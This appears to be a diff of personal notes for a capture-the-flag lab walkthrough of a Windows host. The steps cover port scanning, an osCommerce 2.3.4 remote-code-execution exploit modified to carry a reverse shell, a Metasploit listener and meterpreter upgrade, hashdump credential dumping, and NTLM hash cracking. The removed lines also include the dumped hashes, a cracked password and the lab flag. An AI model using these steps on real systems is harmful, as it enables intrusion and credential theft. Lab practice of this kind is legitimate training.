@@ -1,40 +1,65 @@
-80/tcp    open  http         Microsoft IIS httpd 7.5
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
-|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
-445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
-3306/tcp  open  mysql        MariaDB (unauthorized)
-8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
-|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
-49152/tcp open  msrpc        Microsoft Windows RPC
-49153/tcp open  msrpc        Microsoft Windows RPC
-49154/tcp open  msrpc        Microsoft Windows RPC
-49158/tcp open  msrpc        Microsoft Windows RPC
-49159/tcp open  msrpc        Microsoft Windows RPC
-49160/tcp open  msrpc        Microsoft Windows RPC
+ip : 10.10.91.144
+Domain : BLUEPRINT
 
-########################################################################
-1) inspect the ports and found out that 8080 is running oscommerce
-2) searchsploit oscommerse 2.3.4 and found out that its vulnerable to remote code execution
-3) searchsploit -m the script and altered to fit in a php revers shell
-4) metasploit and use multi/handler to set payloads
-5) set payloads windows/shell/reverse_tcp
-6) set the appropriate options and run it 
-7) while metasploit listening to the port 1234 run the script from 1234 and visit the url provided by the script 
-8) we have a session and we r NT Authority (root)
-9) lets upgrade our session to meterpreter by backgrounding the current session with ctrl+z and checking the sesions with sessions command and use sessions -u 1 to upgrade the session 1 and wait for a meterpreter shell
-10) once success interact with the meterpreter shell by sessions 1
-11) dump the hashes with hashdump and retrieve the hashes of lab,guest and admin
-12) crack the lab NTLM hash with crackstation or any tool
-13) cd /users/Administrator/Desktop/root.txt.txt
-14) cat the root.txt.txt for flag    
-#########################################################################
+- nmap scan
+	80/tcp
+	135/tcp
+	139/tcp
+	443/tcp
+	445/tcp
+	3306/tcp
+	8080/tcp
+	49152/tcp
+	49153/tcp
+	49154/tcp
+	49158/tcp
+	49159/tcp
+	49160/tcp
+ 
+ - we visited port 80 and didnt get any result 
+ - visited 443 and yield no result 
+ - visited 8080 and we see an index page
+ - oscommerce is installed on port 8080
+ - we search for any known exploits for oscommerce 2.3.4 in searchsploit 
+ 
+ 	searchsploit oscommerce 2.3.4
+ 	
+ - we find a couples of exploits including 2 RCE
+ - download one of the RCE python script
+ 
+ 	searchsploit -m 44374.py
+ 	
+ - inspect the exploit and found that we need to insert a windows based php reverse shell into the exploit 
+ - made appropriate changes to the exploit , now we need a listener 
+ - start msfconsole
+ 	> use multi/handler
+ 	> set payload windows/shell/reverse_tcp
+ 	> set lhost tun0
+ 	> set lport 4444
+ 	> run
+ 	
+- now we have a listener 
+- run the exploit
 
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::googleplus
+	python exploit.py
+	
+- the exploit returns a url 
+- visit the url to get a shell
+- we have a shell now 
+- tried whoami and it shows that we are nt authority system
+- we can upgrage the shell to a meterpreter
+- background the shell session with ctrl+z
+- check for live sessions with sessions command     
+- upgrade the shell
+	
+	sessions -u 1
+	
+- now we have an upgraded meterpreter shell
+- dump all the hashes 
 
-lab password :: googleplus
-root.txt.txt :: THM{aea1e3ce6fe7f89e10cea833ae009bee}
+	> hashdump
+	
+- we have all the hashes 
+- decrypt the lab user hash
+- grab the flag from the Administrators desktop
 
